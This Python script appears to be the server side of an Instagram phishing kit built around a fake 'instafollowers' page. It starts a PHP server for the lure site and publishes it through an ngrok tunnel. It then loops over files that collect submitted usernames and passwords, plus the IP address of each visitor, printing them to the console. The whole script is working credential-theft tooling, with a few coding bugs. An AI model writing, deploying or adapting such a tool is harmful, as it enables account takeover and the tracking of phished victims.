from colorama import Fore 
from subprocess import Popen
import os
from pyngrok import ngrok 
import json
import time
import sys


stat_file = 0


def server():
    a=open("instafollowers/usernames.json","w")
    b=a.write("")
    a.close()
    def phpserver():
        with open("Server","w") as phplog:
            Popen(("php","-S","localhost:3030","-t","instafollowers"),stderr=phplog,stdout=phplog)
            
    phpserver()
    u=ngrok.connect(3030,"http").replace("http","https")
    print(u)



    def user():
        global stat_file
        if not str(os.stat("instafollowers/usernames.json").st_size)==stat_file:
            stat_file=str(os.stat("instafollowers/usernames.json").st_size)
            fileip=open("instafollowers/usernames.json","r")
            b=fileip.read()
            try:
                infor=json.loads(b)
                for value in infor['dev']:
                    print(Fore.GREEN+"[+] "+Fore.WHITE+"Username :"+Fore.YELLOW+value['username'])
                    print(Fore.GREEN+"[+] "+Fore.WHITE+"Password :"+Fore.YELLOW+value['password'])
                    a=open("instafollowers/usernames.json","w")
                    b=a.write()
                    a.close()
            except:
                print("")
            
    def userip():
        global stat_file
        if not str(os.stat('instafollowers/ip.txt').st_size)==stat_file:
            stat_file=str(os.stat('instafollowers/ip.txt').st_size)
            fileip=open('instafollowers/ip.txt','r')
            i=fileip.readlines()
            try:
                i=i[-1]
                print(Fore.GREEN+"\n [!]"+Fore.LIGHTCYAN_EX+" IP: %s opened link : "%(i)+time.ctime())
                o=open('instafollowers/ip.txt','w')
                o.write("")
                o.close()
            except:
                print(" ")
            
    try:        
        while True:
            userip()
            user()
    except: 
        os.system("killall -KILL php")
        print("\n God Lock ...:)  ")
        sys.exit()